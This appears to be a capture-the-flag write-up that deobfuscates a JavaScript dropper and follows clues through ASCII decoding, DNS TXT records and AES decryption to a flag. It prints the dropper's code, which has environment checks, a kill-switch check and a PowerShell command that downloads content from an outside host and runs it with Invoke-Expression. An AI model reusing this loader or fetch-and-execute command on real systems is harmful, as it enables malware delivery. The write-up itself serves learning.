# Writeup
First deobfuscate the InfectionVecotr.js. Useful links are
- https://www.dejs.vip/2obfuscator
- https://dev-coco.github.io/Online-Tools/JavaScript-Deobfuscator.html

Once you deobfuscate the js file, you can find a website http://malware.secard.ca
The deobfuscated content will be something like below:
```
const {execSync: execute} = require('child_process');
if (!check_http_connection('https://www.microsoft.com')
     || !check_http_connection('https://www.twitter.com')
     || !check_http_connection('https://www.facebook.com')
     || check_http_connection('https://commandandcontrolkillswitch3154.com')) {
    console.log('Error Code 1: Check Failed!');
    return;
}
if (!is_windows()) {
    console.log('Error Code 2: Check Failed!');
    return;
}
var com1 = '(iwr "http://malware.secard.ca" -UseBasicParsing).Content | ForEach-Object { Invoke-Expression $_ }';
execute_command(com1);

function check_http_connection(url) {
    return new Promise(_0x360dc4 => {
        require('https').get(url, _0x38ecb4 => {
            _0x360dc4(_0x38ecb4.statusCode === 200);
        }).on('error', () => {
            _0x360dc4(false);
        });
    });
}
function is_windows() {
    try {
        const _0x3801b4 = execute('wmic os get Caption').toString();
        return _0x3801b4.includes('Windows');
    } catch (err) {
        console.error('Error executing command:', err.message);
        return false;
    }
}

function execute_command(cmd) {
    console.log(1)
    execute('powershell.exe -command "' + cmd + '"', (_0x35b1a0, _0x55aa67, _0x3a09b0) => {
        console.log(_0x35b1a0.message, _0x3a09b0, _0x55aa67)
        if (_0x35b1a0) {
            console.error('Error executing PowerShell command:', _0x35b1a0.message);
            return;
        }
        if (_0x3a09b0) {
            console.error('PowerShell command execution encountered an error:', _0x3a09b0);
            return;
        }
        console.log('PowerShell command executed successfully. Output:', _0x55aa67);
    });
}
```

The basic workflow is to check some http connection, and then execute the command ```(iwr "http://malware.secard.ca" -UseBasicParsing).Content | ForEach-Object { Invoke-Expression $_ }``` on Windows. The results will be some ascii characters:
```
83
116
97
114
116
45
80
114
111
99
101
115
115
32
34
104
116
116
112
115
58
47
47
119
119
119
46
121
111
117
116
117
98
101
46
99
111
109
47
119
97
116
99
104
63
118
61
100
81
119
52
119
57
87
103
88
99
81
34
32
60
35
77
101
115
115
97
103
101
32
102
114
111
109
32
71
114
101
101
110
32
84
101
97
109
32
116
111
32
82
101
115
101
97
114
99
104
58
32
87
101
32
104
97
118
101
32
114
101
99
101
105
118
101
100
32
100
105
114
101
99
116
105
118
101
115
32
116
111
32
98
101
103
105
110
32
116
104
101
32
100
105
115
109
97
110
116
108
105
110
103
32
111
102
32
80
108
97
99
101
104
111
108
100
101
114
32
105
110
102
114
97
115
116
114
117
99
116
117
114
101
46
32
67
111
110
116
97
99
116
32
97
103
101
110
116
32
67
114
111
109
119
101
108
108
32
102
111
114
32
100
101
116
97
105
108
115
35
62
10
```

Decrypting the ascii codes, you can find a sentence:
```
Start-Process "https://www.youtube.com/watch?v=dQw4w9WgXcQ" <#Message from Green Team to Research: We have received directives to begin the dismantling of Placeholder infrastructure. Contact agent Cromwell for details#>
```
Actually visiting the website http://malware.secard.ca will download a file ``cnc11131482``, which has the same contents as the decryption result.

Seems that the clues are about the agent cromwell. If you check the dns TXT records of secard.ca, you can find some useful information.

```nslookup -q=TXT secard.ca```

```
Server:		172.22.208.1
Address:	172.22.208.1#53

Non-authoritative answer:
secard.ca	text = "Why is agent John Cromwell posting about Rogueware on linkedin? Eh, whatever. I guess it is secured with AES. For any archivist researchers wanting his work, here is his key and IV: Key: !!STOP POSTING ABOUT ROGUEWARE!! IV: I'M TIRED OF SEEING IT! Take ca" "re y'all.  - Agent RK.  "

Authoritative answers can be found from:

```

So try to search John Cromwell on linkedin, and the result is the next step: https://www.linkedin.com/posts/john-cromwell-07110228a_to-all-the-people-messaging-me-online-about-activity-7155001963225501697-gQlS/

We can find the Encryption
```
8c43097ef89399e9431d3ae2526780496f9b20216d0881d5f0ac596fa8a5664f25ed2d3fc1877c63c70b0479c706b33c
```

With the key and iv from the ns TXT record, we can decrypt the result:
```
key: !!STOP POSTING ABOUT ROGUEWARE!!
IV: I'M TIRED OF SEEING IT! Take ca" "re y'all.  - Agent RK.  "
decrypt (cyberchef): https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'UTF8','string':'!!STOP%20POSTING%20ABOUT%20ROGUEWARE!!'%7D,%7B'option':'UTF8','string':'I%5C'M%20TIRED%20OF%20SEEING%20IT!%20Take%20ca%22%20%22re%20y%5C'all.%20%20-%20Agent%20RK.%20%20%22'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=OGM0MzA5N2VmODkzOTllOTQzMWQzYWUyNTI2NzgwNDk2ZjliMjAyMTZkMDg4MWQ1ZjBhYzU5NmZhOGE1NjY0ZjI1ZWQyZDNmYzE4NzdjNjNjNzBiMDQ3OWM3MDZiMzNj
flag: magpie{tH3_GuA4rD_1s_4lWayz_W4TcIn6}
```